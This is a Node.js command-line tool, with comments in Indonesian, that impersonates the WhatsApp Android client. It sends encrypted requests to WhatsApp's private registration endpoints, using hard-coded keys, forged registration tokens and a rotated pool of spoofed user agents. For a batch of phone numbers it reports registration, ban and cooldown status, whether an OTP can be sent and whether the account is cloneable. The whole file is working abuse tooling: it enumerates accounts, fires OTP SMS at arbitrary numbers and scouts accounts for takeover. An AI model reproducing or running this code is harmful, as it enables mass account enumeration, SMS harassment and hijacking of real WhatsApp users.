// probe.js — WA OTP probe + state detection (CLI + library)
//   node probe.js +628123456789
//   node probe.js +62811111111 +62822222222   (batch)
//   DEBUG=1 node probe.js +628123456789        (raw log)

import axios  from 'axios';
import crypto from 'crypto';
import 'dotenv/config';

const DEBUG = process.env.DEBUG === '1';

const WA_SERVER_PUBKEY = Buffer.from(
  '8e8c0f74c3ebc5d7a6865c6c3c843856b06121cce8ea774d22fb6f122512302d',
  'hex'
);

const TOKEN_PRECALC_KEY = Buffer.from(
  'eQV5aq/Cg63Gsq1sshN9T3gh+UUp0wIw0xgHYT1bnCjEqOJQKCRrWxdAe2yvsDeCJL+Y4G3PRD2HUF7oUgiGo8vGlNJOaux26k+A2F3hj8A=',
  'base64'
);

const WA_CERT_DER    = process.env.WA_CERT_DER
  ? Buffer.from(process.env.WA_CERT_DER, 'base64')
  : null;
const WA_CLASSES_MD5 = process.env.WA_CLASSES_MD5
  ? Buffer.from(process.env.WA_CLASSES_MD5, 'base64')
  : null;

const TOKEN_READY = !!(WA_CERT_DER && WA_CLASSES_MD5);
if (!TOKEN_READY && DEBUG) {
  console.warn('[PROBE] WA_CERT_DER / WA_CLASSES_MD5 kosong — jalankan node setup-apk.js dulu');
}

const X25519_SPKI_PREFIX = Buffer.from('302a300506032b656e032100', 'hex');

const UA_POOL = [
  'WhatsApp/2.24.13.76 A',
  'WhatsApp/2.24.11.75 A',
  'WhatsApp/2.24.9.73 A',
  'WhatsApp/2.24.6.77 A',
  'WhatsApp/2.23.24.81 A',
];

const rndUA = () => UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
const rndId = () => crypto.randomBytes(8).toString('hex');

function baseHeaders(ua) {
  return {
    'User-Agent':      ua,
    'Accept':          'application/json, text/plain, */*',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection':      'keep-alive',
  };
}

function splitPhone(phone) {
  const d = phone.replace('+', '');
  if (d.startsWith('62') && d.length >= 11) return { cc: '62', inn: d.slice(2) };
  if (d.startsWith('60') && d.length >= 10) return { cc: '60', inn: d.slice(2) };
  if (d.startsWith('65') && d.length >= 10) return { cc: '65', inn: d.slice(2) };
  if (d.startsWith('1')  && d.length >= 11) return { cc: '1',  inn: d.slice(1) };
  if (d.length >= 10) return { cc: d.slice(0, 2), inn: d.slice(2) };
  return { cc: d.slice(0, 1), inn: d.slice(1) };
}

function importX25519PubKey(rawBytes) {
  return crypto.createPublicKey({
    key:    Buffer.concat([X25519_SPKI_PREFIX, rawBytes]),
    format: 'der',
    type:   'spki',
  });
}

function encryptParams(queryString) {
  const { publicKey: clientPub, privateKey: clientPriv } =
    crypto.generateKeyPairSync('x25519');

  const serverKey    = importX25519PubKey(WA_SERVER_PUBKEY);
  const sharedSecret = crypto.diffieHellman({ privateKey: clientPriv, publicKey: serverKey });

  const iv      = Buffer.alloc(12, 0);
  const cipher  = crypto.createCipheriv('aes-256-gcm', sharedSecret, iv);
  const ct      = Buffer.concat([cipher.update(Buffer.from(queryString, 'utf8')), cipher.final()]);
  const authTag = cipher.getAuthTag();

  const clientPubRaw = clientPub.export({ format: 'der', type: 'spki' }).subarray(12);

  return Buffer.concat([clientPubRaw, ct, authTag]).toString('base64url');
}

function buildToken(phone) {
  const digits = Buffer.from(phone.replace('+', ''), 'utf8');

  if (TOKEN_READY) {
    const data = Buffer.concat([WA_CERT_DER, WA_CLASSES_MD5, digits]);
    return crypto.createHmac('sha1', TOKEN_PRECALC_KEY).update(data).digest('base64');
  }

  const ts = Math.floor(Date.now() / 60_000).toString();
  return crypto.createHmac('sha1', TOKEN_PRECALC_KEY)
    .update(digits.toString('utf8') + ts)
    .digest('base64');
}

async function existProbe(phone) {
  const { cc, inn } = splitPhone(phone);
  const ua = rndUA();

  const innerParams = new URLSearchParams({
    cc, in: inn, lg: 'id', lc: 'ID', id: rndId(),
  });

  const enc = encryptParams(innerParams.toString());

  try {
    const res = await axios.get('https://v.whatsapp.net/v2/exist', {
      params:         { ENC: enc },
      headers:        baseHeaders(ua),
      timeout:        10_000,
      validateStatus: () => true,
    });
    if (DEBUG) console.log(`[EXIST] ${phone} | HTTP ${res.status} | ${JSON.stringify(res.data)}`);
    return { status: res.status, body: res.data };
  } catch (err) {
    if (DEBUG) console.log(`[EXIST ERR] ${phone} | ${err.message}`);
    return { status: 0, body: null, err: err.message };
  }
}

async function codeProbe(phone) {
  const { cc, inn } = splitPhone(phone);
  const ua = rndUA();

  const innerParams = new URLSearchParams({
    cc,
    in:                 inn,
    lg:                 'id',
    lc:                 'ID',
    mistyped:           '6',
    multidevice:        '1',
    method:             'sms',
    sim_mcc:            '510',
    sim_mnc:            '001',
    network_radio_type: '1',
    reason:             '',
    token:              buildToken(phone),
    id:                 rndId(),
    backup_token:       '',
  });

  const enc = encryptParams(innerParams.toString());

  try {
    const res = await axios.get('https://v.whatsapp.net/v2/code', {
      params:         { ENC: enc },
      headers:        baseHeaders(ua),
      timeout:        12_000,
      validateStatus: () => true,
    });
    if (DEBUG) console.log(`[CODE] ${phone} | HTTP ${res.status} | ${JSON.stringify(res.data)}`);
    return { status: res.status, body: res.data };
  } catch (err) {
    if (DEBUG) console.log(`[CODE ERR] ${phone} | ${err.message}`);
    return { status: 0, body: null, err: err.message };
  }
}

function parseCodeBody(status, body, state) {
  if (!body) return state;

  const s      = String(body.status || '').toLowerCase();
  const reason = String(body.reason || '').toLowerCase();
  const retry  = parseInt(
    body.retry_after ?? body.sec_wait ?? body.retry_after_secs ?? body.retry ?? '0',
    10
  ) || 0;

  if (s === 'sent' || s === 'ok') {
    state.registered    = true;
    state.canReceiveOTP = true;
    state.cloneSupport  = body.voice_length !== undefined || body.flash_type !== undefined;
    return state;
  }
  if (s === 'too_recent' || s === 'too-recent' || reason === 'too_recent') {
    state.registered   = true;
    state.cooldown     = true;
    state.cooldownSecs = retry > 0 ? retry : null;
    state.canReceiveOTP = false;
    return state;
  }
  if (s === 'blocked' || s === 'banned' || reason === 'blocked') {
    state.registered   = true;
    state.banned       = true;
    state.bannedType   = retry > 0 ? 'temporary' : 'permanent';
    state.canReceiveOTP = false;
    return state;
  }
  if (reason === 'too_many_requests' || s === 'rate_limit') {
    state.registered   = true;
    state.limitActive  = true;
    state.limitType    = 'rate';
    state.canReceiveOTP = false;
    return state;
  }
  if (reason === 'new_acct' || reason === 'new_account') {
    state.registered   = true;
    state.limitActive  = true;
    state.limitType    = 'new_account';
    state.canReceiveOTP = false;
    return state;
  }
  if (reason === 'spam') {
    state.registered   = true;
    state.limitActive  = true;
    state.limitType    = 'spam';
    state.canReceiveOTP = false;
    return state;
  }
  if (reason === 'no_routes' || s === 'no_routes') {
    state.registered     = true;
    state.noCloneSupport = true;
    state.canReceiveOTP  = false;
    return state;
  }
  if (reason === 'mismatch' || reason === 'no_multidevice') {
    state.registered     = true;
    state.noCloneSupport = true;
    state.canReceiveOTP  = false;
    return state;
  }
  if (reason === 'bad_token' || status === 401) {
    state.registered    = true;
    state.tokenRejected = true;
    state.canReceiveOTP = false;
    return state;
  }
  if (status === 403) {
    state.registered    = true;
    state.canReceiveOTP = false;
    return state;
  }
  if (status === 200) {
    state.registered = true;
    return state;
  }
  return state;
}

export function fmtCooldown(secs) {
  if (!secs || secs <= 0) return null;
  const d = Math.floor(secs / 86400);
  const h = Math.floor((secs % 86400) / 3600);
  const m = Math.floor((secs % 3600) / 60);
  const s = secs % 60;
  const parts = [];
  if (d) parts.push(`${d}h`);
  if (h) parts.push(`${h}j`);
  if (m) parts.push(`${m}m`);
  if (s && !d && !h) parts.push(`${s}d`);
  return parts.join(' ') || '< 1m';
}

export async function probeNumber(phone) {
  const state = {
    phone,
    registered:     false,
    banned:         false,
    bannedType:     null,
    cooldown:       false,
    cooldownSecs:   null,
    cloneSupport:   false,
    noCloneSupport: false,
    limitActive:    false,
    limitType:      null,
    tokenRejected:  false,
    canReceiveOTP:  true,
    raw:            null,
    httpStatus:     0,
  };

  const exist = await existProbe(phone);
  state.raw        = exist.body;
  state.httpStatus = exist.status;

  if (exist.body) {
    const s      = String(exist.body.status || '').toLowerCase();
    const login  = exist.body.login;
    if (s === 'fail' && !login) {
      state.registered    = false;
      state.canReceiveOTP = false;
      return state;
    }
    if (s === 'ok' && login) {
      state.registered = true;
    }
  }

  const code = await codeProbe(phone);
  state.raw        = code.body;
  state.httpStatus = code.status;

  parseCodeBody(code.status, code.body, state);
  return state;
}

// ─── CLI entry ────────────────────────────────────────────────────────────────
const isMain = process.argv[1] && import.meta.url.endsWith(process.argv[1].split('/').pop());
if (isMain) {
  const phones = process.argv.slice(2).filter(p => p.startsWith('+') || /^\d{8,15}$/.test(p));

  if (phones.length === 0) {
    console.error('Usage: node probe.js +628123456789 [+628987654321 ...]');
    console.error('  DEBUG=1 node probe.js +628123456789   → raw log');
    process.exit(1);
  }

  if (!TOKEN_READY) {
    console.warn('[!] WA_CERT_DER / WA_CLASSES_MD5 belum di-set di .env — token fallback dipakai, expect bad_token');
    console.warn('[!] Jalankan dulu: node setup-apk.js /path/to/WhatsApp.apk\n');
  }

  (async () => {
    for (const phone of phones) {
      const p = phone.startsWith('+') ? phone : '+' + phone;
      process.stdout.write(`[*] ${p} ... `);
      const st = await probeNumber(p);

      const tags = [];
      if (!st.registered)          tags.push('TIDAK TERDAFTAR');
      else                          tags.push('TERDAFTAR');
      if (st.banned)                tags.push(`BANNED/${st.bannedType}`);
      if (st.cooldown)              tags.push(`COOLDOWN ${fmtCooldown(st.cooldownSecs) ?? '?'}`);
      if (st.limitActive)           tags.push(`LIMIT/${st.limitType}`);
      if (st.noCloneSupport)        tags.push('NO-CLONE');
      if (st.cloneSupport)          tags.push('CLONE-OK');
      if (st.tokenRejected)         tags.push('TOKEN-REJECTED');
      if (st.canReceiveOTP)         tags.push('OTP-OK');

      console.log(tags.join(' | ') + `  [HTTP ${st.httpStatus}]`);
    }
  })().catch(e => { console.error(e); process.exit(1); });
}
